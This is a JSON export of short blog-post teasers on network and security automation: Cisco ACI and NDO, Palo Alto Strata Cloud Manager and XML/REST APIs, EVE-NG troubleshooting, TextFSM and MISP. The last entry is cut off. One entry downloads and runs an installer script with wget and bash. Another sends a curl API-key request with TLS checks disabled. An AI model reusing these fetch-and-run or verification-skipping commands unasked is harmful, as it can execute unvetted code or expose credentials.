[{"categories":["learning-paths","automation"],"contents":"When developing an automation system for Cisco ACI and NDO, we have several frameworks to choose from:\nAPIs: maximum flexibility, but requiring significant effort and strong programming skills.\nAPIC: API-first approach, with documentation available directly through the Web UI. NDO: APIs are available, but beware of potential breaking changes. The documentation is online (via OpenAPI/Swatter), along with a changelog of breaking changes . Ansible: simplified framework, does not require programming experience.\nAPIC: a fairly complete Ansible collection is available. NDO: a fairly complete Ansible collection is also available. Terraform: more complex, requiring prior expertise; best suited for greenfield environments.\nContinue reading the post on Patreon .\n","cover":"/images/vendors/cisco.webp","permalink":"https://www.adainese.it/blog/2025/10/12/frameworks-for-projects-with-cisco-aci-and-ndo/","title":"Frameworks for Projects with Cisco ACI and NDO"},{"categories":["learning-paths","automation"],"contents":"Let\u0026rsquo;s look at the final relevant example: creating a new interface.\nTo create an interface, we use the POST method and provide the correct data structure. The challenge, however, is determining what that structure should look like.\nContinue reading the post on Patreon .\n","cover":"/images/vendors/paloalto.webp","permalink":"https://www.adainese.it/blog/2025/10/05/creating-an-interface-in-strata-cloud-manager/","title":"Creating an interface in Strata Cloud Manager"},{"categories":["learning-paths","automation"],"contents":"We already highlighted how critical the design phase is in any automation project. This is even more true when working with NDO, since a design mistake could easily compromise the entire project.\nWhen designing templates, you must carefully plan the deployment order to ensure no circular dependencies are created. Dependency checks are performed at the template level, not at the level of the individual objects inside them. Let\u0026rsquo;s look at an example:\nIn this example (courtesy of Mario Rosi ), we have a single schema containing six templates. Each template includes the objects listed below:\nThe first two templates are site-specific and contain objects that are meaningful only within their respective site. These objects do not need to communicate with objects in other sites. The third template is shared across all sites and includes objects that must communicate with those in other sites. The remaining templates contain reusable objects that are also shared across all sites. The arrows in the diagram represent dependencies: they start from the dependent object and point to the object they rely on. For example, a Bridge Domain requires a VRF to be created first. Continue reading the post on Patreon .\n","cover":"/images/categories/learning-paths.webp","permalink":"https://www.adainese.it/blog/2025/10/01/circular-dependencies-with-ndo/","title":"Circular Dependencies with NDO"},{"categories":["learning-paths","automation"],"contents":"This example is particularly relevant because it directly impacts operational workflows.\nBefore diving into the example, let\u0026rsquo;s review the HTTP methods used in REST APIs. HTTP defines five default methods that map to CRUD operations: Create, Read, Update, Delete:\nGET: Retrieve a resource POST: Create a new resource DELETE: Remove a resource PUT and PATCH: Update an existing resource Continue reading the post on Patreon .\n","cover":"/images/vendors/paloalto.webp","permalink":"https://www.adainese.it/blog/2025/09/28/modifying-an-object-in-strata-cloud-manager/","title":"Modifying an object in Strata Cloud Manager"},{"categories":["learning-paths","automation"],"contents":"As infrastructures expand across different geographic locations and distances grow larger, moving from a single-site setup to a multi-site architecture becomes a natural step.\nIn an ideal world, each site in a multi-site deployment should operate independently. In practice, though, applications often have specific requirements that call for stretched L2 networks between sites. Since this is driven by the applications themselves, my advice is to design self-sufficient and independent silos that can continue running even if another site goes down.\nWhen the real need is to connect applications across multiple sites in a native and consistent way, the tool of choice is Cisco Nexus Dashboard Orchestrator (NDO).\nContinue reading the post on Patreon .\n","cover":"/images/categories/learning-paths.webp","permalink":"https://www.adainese.it/blog/2025/09/24/from-single-site-to-multi-site-with-ndo/","title":"From Single-Site to Multi-Site with NDO"},{"categories":["learning-paths","automation"],"contents":"Let\u0026rsquo;s look at a second example that illustrates both the functionality and the complexity of SCM\u0026rsquo;s APIs.\nIn this scenario, we want to retrieve the Ethernet interfaces of the firewalls. A quick search in the documentation leads us to the correct API endpoint .\nUsing the custom class we created earlier, the code is straightforward:\nContinue reading the post on Patreon .\n","cover":"/images/vendors/paloalto.webp","permalink":"https://www.adainese.it/blog/2025/09/21/retrieving-firewall-interfaces-with-strata-cloud-manager/","title":"Retrieving firewall interfaces with Strata Cloud Manager"},{"categories":["learning-paths","automation"],"contents":"Special thanks to Carlo Cianfarani for providing this post.\nIn this post we will explore how to troubleshoot and fix an issue on EVE-NG involving Linux VMs connected through a virtual router instance (Cisco XRd) implemented as docker container. Some time ago, indeed, I managed to extend EVE-NG to support docker containers.\nLab scenario In the scenario depicted, Linux VM ethernet interfaces (e.g. plain e1000 or paravirtualized virtio-net) are attached to two different IP subnets, each implemented by a Linux bridge. Linux VMs run on QEMU hypervisor which, at userspace level, starts a multithreaded process for each VM. Essentially, there is a main thread plus additional threads, one for each VM\u0026rsquo;s assigned vCPU.\nWe can check how EVE-NG networking is implemented under the hood by using:\nIn the above vnet0_1 and vnet0_2 are both Linux bridge implementing ethernet links connecting the VMs to the virtual router\u0026rsquo;s interfaces. vunl0_1_0 and vunl0_2_0 are Linux TAP network devices implementing the VM virtual ethernet interfaces\u0026rsquo; backend.\nvnet0_3_1 and vnet0_3_2 on the other hand are Linux veth network devices where the paired veth lives inside the docker container\u0026rsquo;s network namespace.\nThe following command enters the XRd container\u0026rsquo;s namespaces (PID, network and User) and confirms the associations between veth pairs.\nContinue reading the post on Patreon .\n","cover":"/images/vendors/eve-ng.webp","permalink":"https://www.adainese.it/blog/2025/09/20/eve-ng-linux-vm-ssh-troubleshooting/","title":"EVE-NG Linux VM SSH troubleshooting"},{"categories":["learning-paths","automation"],"contents":"Before moving forward, let\u0026rsquo;s review our current approach to invoking the API:\nWe are using the requests library. We must first generate an authentication token. Many parameters are repeatedly passed in multiple calls. We must verify whether the token has expired. We can improve this workflow by creating a lightweight extension of the requests library.\nThis extension should handle token management automatically, including renewal when needed.\nIt would also be beneficial to centralize header and URL handling to keep our code clean and concise.\nImplementing a Custom API Client Continue reading the post on Patreon .\n","cover":"/images/vendors/paloalto.webp","permalink":"https://www.adainese.it/blog/2025/09/14/optimizing-strata-cloud-manager-api-usage/","title":"Optimizing Strata Cloud Manager API usage"},{"categories":["learning-paths","automation"],"contents":"According to the official documentation , before making any API calls, you must first obtain an access token using your username, password, and tenant service group.\nThis token can then be used to authorize subsequent API requests.\nAlong with the token, the API also returns its validity period, 900 seconds (15 minutes), which must be taken into account when designing automations.\nContinue reading the post on Patreon .\n","cover":"/images/vendors/paloalto.webp","permalink":"https://www.adainese.it/blog/2025/09/07/authenticating-to-the-strata-cloud-manager-api/","title":"Authenticating to the Strata Cloud Manager API"},{"categories":["learning-paths","automation"],"contents":"Before proceeding, we need one more piece of information: how Cisco ACI handles authentication.\nThe documentation indicates that we can authenticate to the APIC via a POST request to /api/aaaLogin.json. The request body must include the username and password inside a JSON object:\nThe response contains, among other things, the session token and its duration:\nThere are two additional important functions:\nContinue reading the post on Patreon .\n","cover":"/images/vendors/cisco.webp","permalink":"https://www.adainese.it/blog/2025/09/03/logging-into-cisco-aci/","title":"Logging into Cisco ACI"},{"categories":["learning-paths","automation"],"contents":"Management of Palo Alto Networks firewalls is gradually shifting from traditional on-premises administration, either directly or via Panorama , to a cloud-based model. The product enabling centralized, cloud-based management of Palo Alto Networks firewall infrastructures is Strata Cloud Manager (SCM) .\nThis management paradigm introduces several fundamental changes:\nData format: Panorama was XML-based, while SCM uses JSON. Configuration model: Panorama relied on Device Groups, Templates, and Template Stacks. SCM uses configuration scopes, where snippets are reusable scopes that can be applied to folders or devices. Variables: Variables existed in Panorama but with limited scope. SCM extends them, allowing usage even within security policies. The approach to structuring complex infrastructures changes significantly. Our focus here is not on designing the architecture, but on creating automation to make migrations and ongoing operations more efficient.\nWe will not cover how to work manually within SCM; instead, we will explore how to interact with SCM through its API.\nCLI There is no official CLI for SCM. However, Calvin Remsburg has developed a personal CLI module and an accompanying SDK enabling command-line management.\nWhile the project is worth reviewing, several caveats apply:\nContinue reading the post on Patreon .\n","cover":"/images/vendors/paloalto.webp","permalink":"https://www.adainese.it/blog/2025/08/31/automating-operations-with-strata-cloud-manager/","title":"Automating operations with Strata Cloud Manager"},{"categories":["learning-paths","automation"],"contents":"Before diving into the Cisco ACI APIs, we need a brief introduction to the hierarchical structure of its elements.\nThis article may look intimidating due to its complexity. In reality, it should be used as a reference whenever we need to better understand a detail in order to optimize our automation. Don\u0026rsquo;t be discouraged, automating a Cisco ACI fabric is actually a very straightforward process.\nPromise Theory Cisco ACI is object-oriented and based on Promise Theory : each object declares the promises it keeps, i.e., it specifies what can be done. Policies establish the relationships between the objects that provide promises and those that consume them:\nLet\u0026rsquo;s take an example related to traffic management between EPGs:\nEPG (Endpoint Group): a group of endpoints promises to provide/accept traffic under specific conditions. Contracts: define the interaction rules between EPGs. Policy model: declares that two EPGs can communicate according to the rules defined in a given contract. At this point, the desired state composed of EPGs, Contracts, and Policy model is pushed down, and objects implement the changes, returning faults when required. Object Model Cisco ACI uses a hierarchical model , in which objects located in different branches can still directly interact.\nThe object model represents the tree of objects and their properties implementing the Cisco ACI fabric. Each Managed Object (MO) has a class and a unique Distinguished Name (DN), formed by its parent name and relative name. The Management Information Model (MIM) describes the structure of the model, the relationships, and the objects. In other words, the object model contains the fabric configuration, implemented according to MIM rules.\nThe object model is managed by an APIC (Application Policy Infrastructure Controller) cluster. Each switch receives the policies from the APIC and enforces them locally.\nContinue reading the post on Patreon .\n","cover":"/images/vendors/cisco.webp","permalink":"https://www.adainese.it/blog/2025/08/27/cisco-aci-object-model-explained/","title":"Cisco ACI object model explained"},{"categories":["learning-paths","automation"],"contents":"Cisco ACI can be managed through five different interfaces:\nGUI: The graphical user interface, typically used for the initial setup and, unfortunately, often still used for direct day-to-day operations on the fabric. CLI: Primarily used for the initial APIC configuration and, later, only in rare cases where special troubleshooting commands are required, either at the APIC level or on individual switches. Cobra SDK : A Python-based SDK that provides a programmatic interface to the fabric using Pythonic methods. Visore : A simple web interface for querying fabric objects. API: A complete set of REST APIs for full programmatic control of the fabric. Continue reading the post on Patreon .\n","cover":"/images/vendors/cisco.webp","permalink":"https://www.adainese.it/blog/2025/08/24/operating-with-cisco-aci/","title":"Operating with Cisco ACI"},{"categories":["learning-paths","automation"],"contents":"Before diving into the technical aspects, it\u0026rsquo;s essential to prepare a dedicated environment for testing and development. Under no circumstances should integrations be tested directly on production systems. A safe, isolated environment is required.\nHere are three recommended options:\nACI Simulator Always-On Application Centric Infrastructure (ACI) Simulator Cisco ACI Mini Fabric ACI Simulator Always-On Cisco provides a persistent sandbox environment known as the ACI Simulator Always-On. This is a continuously running instance of the ACI Simulator, publicly accessible to anyone with an internet connection.\nThe ACI Simulator emulates a small-scale fabric that includes:\nContinue reading the post on Patreon .\n","cover":"/images/vendors/cisco.webp","permalink":"https://www.adainese.it/blog/2025/08/17/setting-up-a-cisco-aci-lab-environment/","title":"Setting up a Cisco ACI lab environment"},{"categories":["learning-paths","automation"],"contents":"Cisco ACI is Cisco\u0026rsquo;s Software-Defined Networking (SDN) solution specifically designed for data center networking. I would argue that it is Cisco\u0026rsquo;s only truly SDN-native solution, as it was built from the ground up to be API-first. In other words, every operation within the system is executed via API.\nBut let\u0026rsquo;s take a step back.\nA brief history of infrastructure Over the years, IT infrastructures have increasingly required capabilities that were not originally envisioned. These capabilities are essential for scaling applications horizontally, enabling multi-site service delivery, supporting workload mobility, and handling disaster recovery scenarios.\nIdeally, applications should be able to scale horizontally in a seamless and agile way. However, in the real world, many applications were designed to rely on a consistent network identity, regardless of where they are running.\nAs a result, infrastructure has evolved to become as transparent and scalable as possible. We\u0026rsquo;ve moved from physical servers to virtual machines that can be migrated (e.g., vMotion) transparently from one host to another, even across sites.\nContinue reading the post on Patreon .\n","cover":"/images/vendors/cisco.webp","permalink":"https://www.adainese.it/blog/2025/08/10/introduction-to-cisco-aci/","title":"Introduction to Cisco ACI"},{"categories":["learning-paths","automation"],"contents":"In this article, we will explore how to troubleshoot EVE-NG nodes that fail to start properly. The symptom is straightforward yet frustrating: when attempting to start a node, it appears to launch but then shuts down after a few seconds without any explanation.\nUnfortunately, some architectural decisions made early on have made it challenging to surface these types of backend errors to the user. This was a deliberate choice, based on the assumption that with correct usage, such failures would be extremely rare. This assumption held true for the most part, but in those few error cases, users remain helpless.\nHere, we will walk through the correct troubleshooting steps. We will connect to the EVE-NG system via SSH as the root user and manually replicate the backend process to identify the failure point.\nLogs Logs are located in /opt/unetlab/data/Logs (note that UNetLab was the predecessor of EVE-NG, and much of the original structure remains intact). The primary file of interest is unl_wrapper.txt, which records all operations performed by the wrapper, the program that mediates communication between the node and the backend. Specifically, the wrapper manages node start, stop, and console operations.\nRun the following command:\ntail -f /opt/unetlab/data/Logs/unl_wrapper.txt Start the problematic node and observe the output. Key lines to note include:\nAug 01 10:07:03 INFO: CWD is /opt/unetlab/tmp/5/1fdf27c0-5e97-4706-a9da-1a82b01c0fde/2 Aug 01 10:07:03 INFO: starting /opt/unetlab/wrappers/qemu_wrapper -C 54179 -T 5 -D 2 -t \u0026#34;vIOS\u0026#34; -F /opt/qemu-2.4.0/bin/qemu-system-x86_64 -d 0 -- -nographic -device e1000,netdev=net0,mac=50:05:00:02:00:00 -netdev tap,id=net0,ifname=vun003000500200,script=no ... Continue reading the post on Patreon .\n","cover":"/images/vendors/eve-ng.webp","permalink":"https://www.adainese.it/blog/2025/08/03/troubleshooting-eve-ng-nodes-that-fail-to-start/","title":"Troubleshooting EVE-NG nodes that fail to start"},{"categories":["learning-paths","automation"],"contents":"UNetLab v3 is built on Django along with various other frameworks. I am not a professional developer, nor do I consider myself one, yet I\u0026rsquo;m often told that my prototypes are extremely useful, especially because I can build them in very short timeframes.\nHowever, since software development is not my main job, my coding activities are irregular, and long breaks between projects often cause me to lose familiarity with the syntax. In the past, Google was my primary tool: I constantly searched for code snippets and constructs just to recall the correct syntax. Using official documentation, Googling for suggestions, and searching for examples to solve specific problems was a very time-consuming process.\nWith the advent of \u0026ldquo;artificial intelligence\u0026rdquo;, I experimented with different approaches until I found a more efficient workflow that I am now using successfully.\nChatGPT for Code Generation A couple of years ago, I started using ChatGPT to directly generate the code I needed. My prompts were along the lines of:\nCreate a Python function using Netmiko to connect to a Cisco device, elevate privileges, retrieve the MAC address table, parse it with TextFSM, and return a dictionary where the keys are interface names and the values are lists of MAC addresses. At the time, the results were almost always subpar: the generated code often included fictional functions and generally didn\u0026rsquo;t work.\nAdapting the generated code took longer than writing it from scratch.\nMoreover, for my needs, describing what I want in detail takes significant time, converting my ideas into descriptive text always leads to incomplete or oversimplified instructions.\nCopilot in Visual Studio Code About a year ago, I tried a second approach: following a colleague\u0026rsquo;s suggestion, I enabled GitHub Copilot in Visual Studio Code and started using it as a coding assistant. The experience was insightful because it made me reflect on my own workflow.\nContinue reading the post on Patreon .\n","cover":"/images/categories/learning-paths.webp","permalink":"https://www.adainese.it/blog/2025/07/27/developing-unetlab-v3-with-ai-llm/","title":"Developing UNetLab v3 with AI (LLM)"},{"categories":["learning-paths","automation"],"contents":"In the previous post, we explored the official pan-os-python library maintained by Palo Alto Networks. We also noted that this library builds upon the personal work of Kevin Steves, who developed the pan-python library, enabling low-level operations on PAN-OS systems. Kevin also included several command-line tools to perform operations via CLI instead of Python.\nThe documentation is available online in reStructuredText format. The following modules are supported:\npan.afapi : provides CLI access to AutoFocus via panafapi pan.licapi : manages PAN-OS licenses via CLI using panlicapi pan.wfapi : interfaces with WildFire via CLI using panwfapi pan.xapi : enables operations via the XML API, accessible via CLI with panconf and panxapi As we\u0026rsquo;ll see in the examples, PAN SDK essentially provides an interface to the XML API, with some added conveniences. The upcoming examples will resemble those from the XML API post.\nPAN SDK relies on Python\u0026rsquo;s ElementTree , which reminds us:\nA large number of log entries can cause a memory exception which may not be possible to catch. Continue reading the post on Patreon .\n","cover":"/images/vendors/paloalto.webp","permalink":"https://www.adainese.it/blog/2025/07/12/automating-palo-alto-firewall-via-python-pan-sdk/","title":"Automating Palo Alto Firewall via Python PAN SDK"},{"categories":["learning-paths","automation"],"contents":"In previous posts, we explored how to automate certain operations on Palo Alto Networks firewalls using XML API and REST API directly. According to the official documentation , there are ready-to-use libraries available for several programming languages (PHP, Go, Python).\nPersonally, I believe Python is the most suitable language for writing automations and integrations. For this reason, we will focus on the Python SDKs. There are two libraries available:\npan-python : developed and maintained personally by Kevin Steves. This library allows low-level operations on PAN-OS systems. pan-os-python : officially developed and maintained by Palo Alto Networks, it enables high-level interaction with firewalls, similar to the CLI or Web interface. This library depends on specific versions of pan-python. The pan-os-python library is officially maintained by Palo Alto Networks. It depends on the pan-python library but is not compatible with its latest version. pan-os-python allows interaction with firewalls and Panorama similarly to the Web interface.\nThe documentation is available online, and the relationships between APIs are described through diagrams.\nOn some systems, you may encounter the following error:\nfrom distutils.version import LooseVersion # Used by PanOSVersion class ModuleNotFoundError: No module named \u0026#39;distutils\u0026#39; In this case, you need to install a specific version of setuptools:\npip install setuptools\u0026amp;gt;=75.1.0 The library organizes various methods into the following classes:\nbase device errors firewall ha network objects panorama plugins policies predefined updater userid Continue reading the post on Patreon .\n","cover":"/images/vendors/paloalto.webp","permalink":"https://www.adainese.it/blog/2025/07/05/automating-palo-alto-firewall-via-python-pan-os-sdk/","title":"Automating Palo Alto Firewall via Python PAN-OS SDK"},{"categories":["learning-paths","automation"],"contents":"Palo Alto Networks firewalls were originally designed around XML APIs. JSON-based REST APIs were introduced later and, as a result, the implementation is currently incomplete and, as we\u0026rsquo;ll see, prone to certain errors. As noted earlier, the API documentation is available directly on the firewall: https://172.25.10.4/restapi-doc/ My recommendation is to use the REST API only for specific, well-tested tasks. In all other cases, it is preferable to rely on the XML API.\nConfiguration Commands via REST API Currently, REST APIs can only be used for configuration tasks. All other operations, including commit, must still be performed using the XML API.\nLet\u0026rsquo;s take the same example from the previous section and create Google\u0026rsquo;s two DNS servers on the firewall. While REST API documentation is more comprehensive, it\u0026rsquo;s sometimes incomplete and not always easy to interpret:\nIf we attempt to use the API without carefully reading the documentation, we receive the following error:\nContinue reading the post on Patreon .\n","cover":"/images/vendors/paloalto.webp","permalink":"https://www.adainese.it/blog/2025/06/28/automating-palo-alto-firewall-via-rest-api/","title":"Automating Palo Alto Firewall via REST API"},{"categories":["learning-paths","automation"],"contents":"Palo Alto Networks firewalls provide XML-based APIs for interacting with the system. To use the API, the first step is to generate an API key that will authenticate our requests:\ncurl -k -H \u0026#34;Content-Type: application/x-www-form-urlencoded\u0026#34; -X POST https://firewall/api/?type=keygen -d \u0026#39;user=admin\u0026amp;amp;password=password\u0026#39; Alternatively, a simple Python script can be used:\nAt this point, we can use the XML API to perform any operation typically executed via the web interface or CLI. The token must be passed as a GET parameter in every API request. Documentation is available directly on the firewall at: https://172.25.10.4/php/rest/browse.php The script is available in the GitHub repository .\nOperational Commands via XML API Let\u0026rsquo;s revisit the example from the previous post and retrieve the ARP table. Documentation provides the XML call to execute: https://172.25.10.4/php/rest/browse.php/op::show::arp The script is straightforward:\nThe output is the ARP table in XML format:\nXML is not the most Python-friendly format. The official documentation warns about various risks:\nHowever, we can treat the XML output from the firewall as trusted and proceed using the ElementTree library .\nCompared to JSON, navigating XML requires more experience. The example below shows how to extract data from the XML response returned by the firewall:\nThe script output is similar to the following:\nContinue reading the post on Patreon .\n","cover":"/images/vendors/paloalto.webp","permalink":"https://www.adainese.it/blog/2025/06/21/automating-palo-alto-firewall-via-xml-api/","title":"Automating Palo Alto Firewall via XML API"},{"categories":["learning-paths","automation"],"contents":"The first method we will discuss is called screen scraping, a topic already covered in the past. We use the screen scraping approach when automating devices that are designed to be managed via CLI, without APIs that allow us to cover all the scenarios we are interested in. Screen scraping is commonly used when dealing with network devices.\nAs we will see later, Palo Alto Networks firewalls offer XML-based APIs that make the screen scraping approach less attractive unless for very specific cases.\nFor Palo Alto Networks firewalls, screen scraping can be useful for performing specific actions related to monitoring and troubleshooting.\nLet\u0026rsquo;s look at a couple of examples.\nThe first example is a request from a client several years ago. The client wanted to implement a device locator that would allow them to identify the location of a device based on its MAC address or IP address. It was necessary to gather the MAC address table and the ARP table from all devices. For the ARP table, we needed to retrieve the output of the show arp all command and convert it into machine-readable format (parsing): this is screen scraping.\nWe will use two tools:\nnetmiko to connect to the devices, execute the command, and collect the output. NTC Templates to transform the output into JSON format. Continue reading the post on Patreon .\n","cover":"/images/vendors/paloalto.webp","permalink":"https://www.adainese.it/blog/2025/06/14/automating-palo-alto-firewall-via-cli/","title":"Automating Palo Alto Firewall via CLI"},{"categories":["learning-paths","automation"],"contents":"The automation of firewalls is still a relatively under-discussed topic compared to the automation of network devices. This is likely due to complexity: firewall policies tend to be a long list of rules, created by different people, for different (application) purposes, and aggregated together. The order of these rules is often crucial and has direct performance impacts. Creating a model to describe them is far from simple. While other tasks can be automated, in my experience, they are of relatively minor importance.\nLet\u0026rsquo;s take a step back and identify the activities a security engineer performs throughout the lifecycle of a firewall:\nProvisioning: These are one-time or occasional tasks that configure the foundation of a firewall (IP addressing, routing, VLANs, DNS, NTP, licenses, etc.). Rules: These tasks involve adding, modifying, or deleting rules in response to changes in the services passing through one or more firewalls. Maintenance: These tasks allow us to monitor the status of a firewall or perform troubleshooting in case of anomalies or unexpected behaviors. Continue reading the post on Patreon .\n","cover":"/images/vendors/paloalto.webp","permalink":"https://www.adainese.it/blog/2025/06/07/introduction-to-palo-alto-firewall-automation/","title":"Introduction to Palo Alto firewall automation"},{"categories":["learning-paths","automation"],"contents":"Many network devices provide two commands to retrieve specific information: the first command returns a summarized output in tabular format, while the second command provides a more detailed view, typically in a non-tabular format where each entry is separated into a specific section.\nAlthough the tabular format is more human-readable, non-tabular text is significantly easier for a machine to interpret.\nLet\u0026rsquo;s look at an example: the show interfaces command displays detailed information about the interfaces configured on a switch.\nThe first step is to identify the pieces of information we\u0026rsquo;re interested in, each of which must be associated with a RegEx. Here are a few examples:\nInterface, which is mandatory and serves as the key: \\w+/\\d+/\\d+ Bandwidth, which is a string delimited by a comma: [^,]+ Description, which is a generic string ending at the end of the line: .+ Line status, which is one of several possible strings: up|down|administratively down MAC address, which consists of three hexadecimal sequences separated by dots: ([0-9a-f.]{4}.){2}[0-9a-f]{4} MTU, which is a number: \\d+ Protocol status, which is one of several possible strings: up|down Interface type, which is a string delimited by a comma: [^,]+ Continue reading the post on Patreon .\n","cover":"/images/categories/learning-paths.webp","permalink":"https://www.adainese.it/blog/2025/05/31/textfsm-parsing-non-tabular-text/","title":"TextFSM: parsing non-tabular text"},{"categories":["learning-paths","automation"],"contents":"Once our MISP instance is properly configured, it contains a set of threat intelligence data that can be leveraged by prevention tools such as Firewalls, Email Gateways, and more.\nLet\u0026rsquo;s explore how to extract IoCs from MISP. Specifically, we\u0026rsquo;ll look at how to create a list of IP addresses to be proactively blocked by perimeter systems.\nModern firewalls are capable of ingesting External Dynamic Lists (EDLs) , which are simply text files hosted on web servers containing lists of IP addresses. These lists can then be referenced within security policies to take specific actions.\nWhile the number of IP addresses that can be managed via EDLs might seem substantial, it becomes clear that these limits are relatively low when compared to the global volume of IP-based IoCs .\nThis underscores the importance of managing IoCs in a structured way, with particular attention to their lifecycle.\nNative Export MISP natively supports exporting attributes in multiple formats. By navigating to Event Actions -\u0026gt; Export, we can generate IoC lists in various formats:\nContinue reading the post on Patreon .\n","cover":"/images/categories/learning-paths.webp","permalink":"https://www.adainese.it/blog/2025/05/24/consuming-misp-iocs-from-a-firewall/","title":"Consuming MISP IoCs from a Firewall"},{"categories":["learning-paths","automation"],"contents":"In the previous post, we discussed how to structure the output of the show interfaces command. Now, for educational purposes, let\u0026rsquo;s examine how to structure the equivalent command that returns output in tabular format: show interfaces status.\nThe first step is to identify the relevant pieces of information, each of which must be associated with a RegEx:\nInterface, which is mandatory and also serves as the key: \\w+/\\d+/\\d+ Name (description), which is an optional, generic string that may include spaces: .+? Status, which is one of several possible strings: connected|notconnect|disabled VLAN, which is a number: \\d+ Duplex, which is a non-space string: \\S+ Speed, which is a non-space string: \\S+ Continue reading the post on Patreon .\n","cover":"/images/categories/learning-paths.webp","permalink":"https://www.adainese.it/blog/2025/05/17/textfsm-parsing-tabular-text/","title":"TextFSM: parsing tabular text"},{"categories":["learning-paths","automation"],"contents":"TextFSM is a framework developed by Google that enables the transformation (parsing) of human-readable text into structured, machine-readable output.\nTextFSM, available as a Python module, is one of the essential tools when automating a network device that requires CLI interaction, allowing us to interpret the output in order to make decisions.\nLet\u0026rsquo;s look at an example: we want to analyze the interfaces of a switch and shut down the ones that are not connected.\nThe following output is human-readable, but it cannot be used directly within a script.\nTextFSM helps convert the above output into a structured format:\nFinite State Machine TextFSM operates as a finite state machine (FSM), starting from the Start state and implicitly ending at the EOF state, which is reached at the end of the file.\nThe process can be summarized as follows:\nThe first line of the input text is read The line is matched against a set of rules, starting from the top If a rule matches, the corresponding action is executed and the line is \u0026ldquo;consumed\u0026rdquo; The next line of the input is read and matched against the rule set again, starting from the top Once the entire input has been processed, the FSM terminates and returns the structured output The actions, described below, can modify the default behavior of the FSM.\nRule Actions A simple template contains a set of rules within the Start state, which is mandatory. The Start state is the entry point of the FSM and processes the rules defined within it, starting from the first.\nEach rule consists of a regular expression followed by one or more optional actions. Actions can be categorized as follows:\nLine Action: allows control over the selection of the next input line and, consequently, which rule will be applied next. Record Action: allows control over how the extracted values are stored in a record. State Transition: allows moving to a different state. Consider the following example :\nThe corresponding template is as follows:\nContinue reading the post on Patreon .\n","cover":"/images/categories/learning-paths.webp","permalink":"https://www.adainese.it/blog/2025/05/10/parsing-text-with-textfsm/","title":"Parsing text with TextFSM"},{"categories":["learning-paths","automation"],"contents":"Installing MISP is relatively straightforward and is well documented in the user guide . For some reason, the user guide does not yet mention Ubuntu 24.04, although the installation script is available in the repository.\napt-get update apt-get upgrade -y wget -O /tmp/INSTALL.sh https://raw.githubusercontent.com/MISP/MISP/refs/heads/2.5/INSTALL/INSTALL.ubuntu2404.sh bash /tmp/INSTALL.sh At this point, the installation begins, displaying each step as it proceeds:\nAt the end, credentials to access the platform are shown:\nBy default, the platform is accessible at https://misp.local . If the system is reachable through a different FQDN, you can update the /var/www/MISP/app/Config/config.php file:\nContinue reading the post on Patreon .\n","cover":"/images/categories/learning-paths.webp","permalink":"https://www.adainese.it/blog/2025/05/06/installing-misp/","title":"Installing MISP"},{"categories":["learning-paths","automation"],"contents":"MISP is a platform for threat intelligence, not for incident management. Specifically, MISP helps manage Indicators of Compromise (IoCs) in a structured way, and therefore it must be integrated into an existing ecosystem.\nVery often, TheHive is used as the incident management platform, but integration requests also commonly involve Splunk , Elastic , Maltego , and detection and prevention systems (antispam, honeypot, firewall, etc.).\nA MISP event does not represent a security incident, but rather a threat that is analyzed and evaluated from a threat intelligence perspective. Much of the work (defining IoCs and artifacts) has likely already been carried out on other platforms: we are evaluating the event and its associated IoCs to determine whether they provide added value for us and for the communities we are part of.\nAutomating MISP Tasks The following activities can be identified for automation:\nContinue reading the post on Patreon .\n","cover":"/images/categories/learning-paths.webp","permalink":"https://www.adainese.it/blog/2025/05/04/integrating-and-automating-misp/","title":"Integrating and automating MISP"},{"categories":["learning-paths","automation"],"contents":" MISP (Malware Information Sharing Platform) is an open-source software solution for collecting, storing, distributing, and sharing cybersecurity indicators and threat intelligence related to cybersecurity incident analysis and malware analysis. MISP is designed for incident analysts, security professionals, ICT specialists, and malware reverse engineers to support their daily operations and efficiently share structured information.\nLaunched in 2011 to manage Indicators of Compromise (IoCs) in a structured manner, MISP has since evolved and is now used by national CERTs and NATO, which gave the platform its name. Today, MISP is also utilized by organizations like ACN and various entities that require structured IoC management.\nAdditionally, MISP has been used by the European Payments Council (EPC) to share timely information aimed at preventing and intercepting fraudulent activities in payment transactions. For further details, refer to the CIPA note .\nContinue reading the post on Patreon .\n","cover":"/images/categories/learning-paths.webp","permalink":"https://www.adainese.it/blog/2025/05/04/introduction-to-misp/","title":"Introduction to MISP"},{"categories":["learning-paths","automation"],"contents":"In today\u0026rsquo;s fast-paced digital world, manually tracking and responding to cybersecurity threats is no longer enough. Automating threat intelligence helps organizations stay one step ahead by streamlining detection, analysis, and response. In this opening post, we\u0026rsquo;ll dive into the basics of automation in threat intelligence and why it\u0026rsquo;s becoming an essential part of modern cybersecurity strategies. Let\u0026rsquo;s explore how automation can help you tackle today\u0026rsquo;s evolving threats more efficiently and effectively.\n01. Introduction to MISP 02. Installing MISP 03. Integrating and automating MISP 04. Consuming MISP IoCs from a Firewall If you found this information useful, consider supporting us on Patreon for more in-depth guides and tutorials.\n","cover":"/images/categories/learning-paths.webp","permalink":"https://www.adainese.it/blog/2025/05/04/threat-intelligence-automation-series/","title":"Threat Intelligence automation series"},{"categories":["learning-paths","automation"],"contents":"Previously, we discussed improving documentation management by focusing on content rather than tools. Specifically, we explored how high-quality documents can be generated using Markdown , CSS, and WeasyPrint .\nWhen it comes to documents, optimization is not just about streamlining content writing but also about automating parts of the process. Many business reports, for instance, can be automatically generated, requiring analysts only to provide data commentary.\nFor my personal productivity, I faced a similar challenge: improving slide creation in the same way.\nMicrosoft PowerPoint My experience with PowerPoint has been largely negative, and I see that many share this sentiment. While it theoretically supports master templates and offers a wide range of features, practical use reveals significant issues. Transferring content between presentations with different formats becomes an error-prone process, making it difficult to maintain consistent styling.\nIn enterprise environments, it is common to encounter presentations with mismatched and outdated styles. Centralizing templates at the organizational level is virtually impossible.\nGoogle Slides Google Slides impressed me with its simplicity. Its essential feature set is sufficient for my needs, allowing for clean presentations with consistent styles. Moving content between different presentations is also relatively easy.\nHowever\u0026hellip;\nFrom a strategic perspective, I am moving towards a cloud-exit approach. Google uses a proprietary format that is only fully functional within its ecosystem. While I can export presentations in other formats, this reintroduces the very same issues I sought to avoid.\nSlides as Code Several tools allow slide creation using Markdown, including:\nSlidev Marp Reveal.js Continue reading the post on Patreon .\n","cover":"/images/categories/learning-paths.webp","permalink":"https://www.adainese.it/blog/2025/05/03/writing-presentations-with-markdown/","title":"Writing presentations with Markdown"},{"categories":["learning-paths","automation"],"contents":"We have explored how to transparently segment an OT/ICS network into groups using VLAN Insertion from Palo Alto Networks. The flexibility of this feature has allowed us to divide our lab environments into groups without the need to reconfigure IP addresses. Additionally, this solution enables us to define policies to allow specific communications between groups when 